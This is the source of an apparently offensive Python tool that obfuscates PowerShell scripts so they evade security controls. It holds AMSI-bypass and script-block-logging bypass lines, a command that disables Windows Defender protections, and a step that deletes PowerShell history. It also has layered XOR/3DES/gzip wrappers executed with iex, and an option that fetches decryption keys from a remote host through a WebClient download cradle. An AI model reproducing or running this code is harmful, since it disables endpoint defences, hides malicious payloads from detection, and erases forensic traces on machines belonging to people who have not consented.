#!/usr/bin/env python3.8
import base64
import gzip
import random
import string
import sys
import re
import os
import subprocess
import argparse
import time
from Crypto.Cipher import DES3
    
from clogger import Logger


log = Logger(consolefh=sys.stderr)

DEBUG = False
O_DEBUG = False
O_DEBUG_PATH = './debug_obfu/'

ender = """echo all i wanna see"""

bypass = [
    """[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed',40).SetValue($null,$true)""",
    """[Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures",40).SetValue($null, (New-Object "System.Collections.Generic.HashSet[string]"))""",
    """$settings=[Ref].Assembly.GetType("Management.Automation.Utils").GetField("cachedGroupPolicySettings",40).GetValue($null)""",
    """$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}""",
    """$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")""",
    """[ScriptBlock].GetField('signatures',40).SetValue($null,(New-Object Collections.Generic.HashSet[string]))""",
    """Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend""",
    ]


ending_actions = ';'.join([
            ' rm -Force -ErrorAction Continue $env:APPDATA"\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" ',
            ])


def sizeof_fmt(num, suffix='B'):
    for unit in ['','Ki','Mi','Gi','Ti','Pi','Ei','Zi']:
        if abs(num) < 1024.0:
            return "%3.1f%s%s" % (num, unit, suffix)
        num /= 1024.0
    return "%.1f%s%s" % (num, 'Yi', suffix)


def rand_case(s):
    if type(s) != str:
        s = s.decode('utf-8')
    return ''.join(x.lower() if round(random.random()) else x.upper() for x in s)


def rand_char():
    return random.choice(string.ascii_letters)


def rand_string(l=8):
    return ''.join(random.choice(string.ascii_letters+string.digits) for x in range(l))


def get_cmdlets():
    log.info('Getting commandlets')
    ret = ''
    if os.path.exists('/usr/bin/pwsh'):
        log.debug('Found powershell core')
        ret = subprocess.check_output('''/usr/bin/pwsh -C "Get-Command * {$_.CommandType -eq 'Cmdlet'} |  select name -expandproperty name"''', shell=True).decode('utf-8').strip()
    else:
        log.warn('Unable to find powershell core, using builtin list')
        with open('cmdlets.lst','r') as f:
            ret = f.read()
    return list(filter(lambda x:x, ret.split('\n')))


def remove_block_comments(s):
    if type(s) != str:
        s = s.decode('utf-8')
    return dwrite(s)


def wrap_try(s):
    log.debug('Running Wrap Try')
    if type(s) != str:
        s = s.decode('utf-8')
    return 'try{{{0}}}catch{{write $_.Exception.Message}}'.format(s)


def build_bypass(l=bypass):
    log.info('Building Bypass')
    
    dbg = ''
    if O_DEBUG:
        dbg = 'echo "Starting bypass";'

    return dbg + ';'.join(map(wrap_try,l))


def fs_xor(s, k=None):
    log.info('Running Forward Single Char XOR Obfuscation')

    if type(s) != str:
        s = s.decode('utf-8')

    if not k:
        k = random.choice(list(string.ascii_letters+string.digits))
    s = ''.join([chr(ord(x) ^ ord(k)) for x in s ]).encode('utf-8')
    k = str(ord(k))

    if args.online:
        k = online_resource(k)
    else:
        k = "'"+k+"'"
    
    dbg = ''
    if O_DEBUG:
        dbg = 'echo "Starting fs_xor";'
    
    return dwrite(rand_case('''$x="";{2};$a=[Convert]::FromBase64String("{0}");$d={1};for($i=0;$i -le $a.Length-1;$i++){{$a[$i]=$a[$i]-bxor $d}};clear-variable d,i;iEx([Text.Encoding]::UTF8.GetString($a));''').format(base64.b64encode(s).decode('utf-8'), k, dbg))


def rs_xor(s, k=None):
    log.info('Running Reverse Single Char XOR Obfuscation')
    if type(s) != str:
        s = s.decode('utf-8')
    if not k:
        k = random.choice(list(string.ascii_letters+string.digits))
    s = ''.join([chr(ord(x) ^ ord(k)) for x in s ])[::-1].encode('utf-8')
    
    if args.online:
        k = online_resource(k)
    else:
        k= "'"+k+"'"
    
    dbg = ''
    if O_DEBUG:
        dbg = 'echo "Starting rs_xor";'

    return dwrite(rand_case('''$x="";{2};$a=[Convert]::FromBase64String("{0}");$d={1};for($i=$a.Length;$i--;){{$a[$i]=$a[$i]-bxor $d}};clear-variable d,i;iEx([Text.Encoding]::UTF8.GetString($a));''').format(base64.b64encode(s).decode('utf-8'), k,dbg))


def fm_xor(s, k='', length=None):
    log.info('Running Forward Multi Char XOR Obfuscation')
    if type(s) != str:
        s = s.decode('utf-8')
    if not len(k) or not length:
        length = random.randint(1,99)
        k = ''.join([random.choice(list(string.ascii_letters+string.digits)) for x in range(length)])

    s = ''.join([chr(ord(x) ^ ord(k[i%len(k)])) for i,x in enumerate(s)]).encode('utf-8')
    k = base64.b64encode(k.encode('utf-8')).decode('utf-8')

    if args.online:
        k = online_resource(k)
    else:
        k = '"'+k+'"'

    dbg = ''
    if O_DEBUG:
        dbg = 'echo "Starting fm_xor";'

    return dwrite(rand_case('''$x="";{2};$a=[Convert]::FromBase64String("{0}");$z=[Convert]::FromBase64String({1});for($i=0;$i -le $a.Length-1;$i++){{$a[$i]=$a[$i]-bxor $z[$i%$z.length] }};clear-variable z,i;iEx([Text.Encoding]::UTF8.GetString($a));clear-variable a,x,o''').format(base64.b64encode(s).decode('utf-8'), k, dbg))

def b64(s):
    log.info('Running Base64 Obfuscation')
    if type(s) != bytes:
        s = s.encode('utf-8')

    dbg = ''
    if O_DEBUG:
        dbg = 'echo "Starting b64";'

    return dwrite(';{1};iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{0}")))'.rand_case().format(base64.b64encode(s).decode('utf-8'), dbg))

def gz(s):
    if args.pad:
        log.info(f"pre-pad size: {sizeof_fmt(sys.getsizeof(s))}") 
        s += '\n'*args.pad+';'
        log.info(f"after-pad size: {sizeof_fmt(sys.getsizeof(s))}") 

    log.info('Running GZIP Obfuscation')
    if type(s) != bytes:
        s = s.encode('utf-8')
    
    pre_len = len(s)-1
    s = gzip.compress(s)

    dbg = ''
    if O_DEBUG:
        dbg = 'echo "Starting gzip";'

    return dwrite(rand_case(''';{1};$i=New-Object IO.MemoryStream(,[Convert]::FromBase64String('{0}'));$o=New-Object IO.MemoryStream;$g=New-Object IO.Compression.GzipStream $i,([IO.Compression.CompressionMode]::Decompress);$g.CopyTo($o);clear-variable g,i,x;iEx([Text.Encoding]::UTF8.'GetString'($o.ToArray()));clear-variable o;''').format(base64.b64encode(s).decode('utf-8'), dbg ))
    #return dwrite(rand_case('''$i=New-Object IO.MemoryStream(,[Convert]::FromBase64String('{0}'));$o=New-Object IO.MemoryStream;$g=New-Object IO.Compression.GzipStream $i,([IO.Compression.CompressionMode]::Decompress);$r="";for($u=0;$u -le {1}; $u++){{$r+=[Text.Encoding]::UTF8.GetString($g.readbyte())}};iEx($r);''').format(base64.b64encode(s).decode('utf-8'), pre_len )) # less mem but much more compute, maybe in a mem restricted env???

def remove_quotes(s):
    if (s[0] in ("@",) and s[-1] in ("@",)) and s[1] in ("'",'"') and s[-2] in ("'",'"'):
        s = s[2:-2]
    if s[0] in ("'",'"') and s[-1] in ("'",'"'):
        s = s[1:-1]
    return s

def string_obfu_method1(s):
    return dwrite("({0})".format('+'.join([ f'[char]{ord(x)}' for x in remove_quotes(s)])))

def string_obfu_method2(s):
    return dwrite("({0}|%{{($_.length-as[char])}})-join''".format( ','.join([f"'{' '*ord(x)}'" for x in remove_quotes(s) ])))

def string_obfu_method3(s):
    rand = list(set(s))
    random.shuffle(rand)
    rand = ''.join(rand)
    st,fr = ([], list(["([char]{0})".format(ord(a)) for a in rand]))
    list([st.append('{{{0}}}'.format(rand.find(x))) for x in s])
    return dwrite("('{0}'-f{1})".format(''.join(st),','.join(fr)))

def disabled_string_obfu_method4(s):
    rand = list(set(s))
    random.shuffle(rand)
    rand = ''.join(rand)
    st,fr = ([], list(rand))
    list([st.append('{{{0}}}'.format(rand.find(x))) for x in s])
    return dwrite("('{0}'-f'{1}')".format(''.join(st),"','".join(fr)).replace("'''","'\\'").replace("'\\'","'\\\\'"))


def rand_string_obfu(s,available_methods=None):
    if not available_methods:
        available_methods = list(map(eval,filter(lambda x:x.startswith('string_obfu_method'), globals() )))
    available_methods
    m = random.choice(available_methods)
    log.debug(f"{m.__name__} Chosen for string")
    return m(s)


def string_obfu(s):
    log.info('Running String Obfuscation')
    if type(s) != str:
        s = s.decode('utf-8')
    f_strings,m_strings,find = [],[],[]
    #print(s)
    find.extend(re.findall('(@".{10,}?"@)|(@\'.{10,}?\'@)',s,re.DOTALL+re.MULTILINE))
    find.extend(re.findall('(".*?(?<!`)")|(\'.*?(?<!`)\')',s))
    #print('asd',find)
    if find:
        [[f_strings.append(a) for a in x if len(a)>4] for x in find]
        if f_strings:
            #print('dsa',f_strings)
            for st in f_strings:
                n = rand_string_obfu(st)
                if '$' not in st and list(set(st)) != " ":
                    log.debug(f"obfu: {st} {n}")
                    s = s.replace(st,n,1)
    return dwrite(s)

def triple_des(s):
    if type(s) != bytes:
        s = s.encode('latin1')
    
    log.info('Running 3DES Obfuscation')
    key = os.getrandom(16)
    iv = os.getrandom(8)
    des = DES3.new(key, DES3.MODE_CBC, iv)
    s += b' '*(8-(len(s)%8))
    enc = des.encrypt(s)
    dec = DES3.new(key, DES3.MODE_CBC, iv)
    try:
        if dec.decrypt(enc) == s:
            log.debug("Encryption is working fine")
        else:
            log.debug("Strings do no match, no other error")
            raise Exception('Strings do not match')
    except:
        log.error("Encryption is fucked")
        raise Exception('Encryption routine is borked')
    key = base64.b64encode(key).decode('utf-8')
    iv = base64.b64encode(iv).decode('utf-8')
    
    enc_l = len(enc)
    enc = base64.b64encode(enc).decode('utf-8')

    if args.online:
        key = online_resource(key)
        iv = online_resource(iv)
    else:
        key = f'''"{key}"'''
        iv = f'''"{iv}"'''
    
    dbg = ''
    if O_DEBUG:
        dbg = 'echo "Starting 3des";'
        
    return dwrite(rand_case(';{4};$p=New-Object Security.Cryptography.TripleDESCryptoServiceProvider;$p.Padding=1;$d=$p.CreateDecryptor([Convert]::FromBase64String({0}),[Convert]::FromBase64String({1}));iex([Text.Encoding]::UTF8.GetString($d.TransformFinalBlock([Convert]::FromBase64String("{2}"),0,{3})));clear-variable p,d').format(key,iv,enc,enc_l,dbg))


def online_resource(s):
    fp = ''
    while not os.path.exists(fp):
        wp = '/'.join([rand_string() for x in range(3)])
        path = os.path.join(args.keystore_dir,wp)
        filename = rand_string(8)
        fp = os.path.join(path,filename)
        if not os.path.exists(fp):
            os.makedirs(path, exist_ok=True)
            f = open(fp,'w')
            f.write(s)
            f.flush()
            f.close()
            log.info(f"Stored resource at: {fp}")

    return f"( {cmdlet_obfu('New-Object')} ({rand_string_obfu('System.Net.WebClient')})).({rand_string_obfu('DownloadString')})({rand_string_obfu('/'.join((args.url, os.path.join(wp,filename))))})"
        


def dwrite(s):
    if O_DEBUG:
        if not os.path.exists(O_DEBUG_PATH):
            os.mkdir(O_DEBUG_PATH)
        with open('/'.join([O_DEBUG_PATH,'DEBUG_OUTPUT_{0}'.format(time.time())]),'w') as f:
            f.write(s)
            f.close()
    return s

funcs = (fs_xor, # Single-Byte XOR
         fm_xor, # Multi-Byte XOR
         #rs_xor, # reversed Single-Byte XOR ; broke right now
         #b64, # Base64 # disabled for now
         #gz, # GZIP # disabled for now
         triple_des, # 3DES
         )

def cmdlet_obfu(s):
    log.debug('Running Commandlet obfuscation')
    if type(s) != str:
        s = s.decode('utf-8')
    for c in sorted(get_cmdlets(), key=len):
        while c in s:
            n = c.strip().lower()
            log.info('Found: {0}'.format(c))
            cmd = rand_string_obfu(n)
            log.debug(cmd)    
            #print(subprocess.check_output('''/usr/bin/pwsh -C "{0}"'''.format(cmd), shell=True).decode('utf-8').strip())
            cmd = ' &({0}) '.format(cmd)
            log.info('Obfuscated as: "{0}"'.format(cmd))
            s = s.replace(c,cmd,1)
    return s

    

#print(get_cmdlets())


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-O', '--output-path', help='Output file path', default=None)
    parser.add_argument('-do', '--debug-obfu', help='Enable Obfuscation Debugging', default=False, action="store_true")
    parser.add_argument('-dp', '--debug-obfu-path', help='Obfuscation Debugging Path', default="./debug_obfu/")
    parser.add_argument('-d', '--debug', help='Enable Debug Logging', default=False, action="store_true")
    parser.add_argument('-ng', '--no-gzip', help='No Inital GZIP', default=False, action="store_true")
    parser.add_argument('-op', '--only-pack', help='No Inital obfuscation', default=False, action="store_true")
    parser.add_argument('-r', '--rounds', help='# of Obfuscation Rounds', type=int, default=3)
    parser.add_argument('-p', '--pad', help='Pad gzip with X bytes (new lines)', type=int, default=0)
    parser.add_argument('-o', '--online', help='Use online keys',default=False, action="store_true")
    parser.add_argument('-k', '--keystore-dir', help='Keystore dir', default="./keystore")
    parser.add_argument('-u', '--url', help='URL where keys are', default="http://192.168.122.1/")
    parser.add_argument('file', help='Powershell script to obfuscate, - for stdin')
    args = parser.parse_args()
    
    
    
    if args.debug:
        DEBUG = True
        log.set_level('DEBUG')
        log.debug('Debugging Enabled')
        
    if args.debug_obfu:
        O_DEBUG = True
        log.info('Output Debugging Enabled')
        O_DEBUG_PATH = args.debug_obfu_path
        log.info('Output Debugging Path "{0}"'.format(O_DEBUG_PATH) )
    
    if args.file == '-':
        _file = sys.stdin
    else:
        _file = open(args.file)
    
    
    c = []
    p = _file.read()
    if not args.only_pack:
        p = string_obfu(cmdlet_obfu(p))
    
    
    b = string_obfu(build_bypass())
    #log.info(f"{b}")
    #print(b)
    #exit()
    
    #print(p)
    
    if not args.no_gzip:
        p = gz(p)
        
    
    [(a:=random.choice(funcs), p:=(gz(a(p)),log.info(f"Size is now: {sizeof_fmt(sys.getsizeof(p))}"))[0], c.append( str(a.__name__) )) for _ in range(args.rounds)]
    

    p = '{0};$x="";{1};{2}'.format(b, p, ending_actions)
    
    if not args.no_gzip:
        
        
        p = gz(p)
    log.info(f"Final length: {sizeof_fmt(sys.getsizeof(p))}")
    if args.output_path:
        with open(args.output_path,'w') as f:
            f.write(p)
            f.flush()
    else:
        print(p)

    log.info("Rounds ran:")
    for r in c:
        log.info(r)
    log.info(f"You can use: iex({online_resource(p)})")


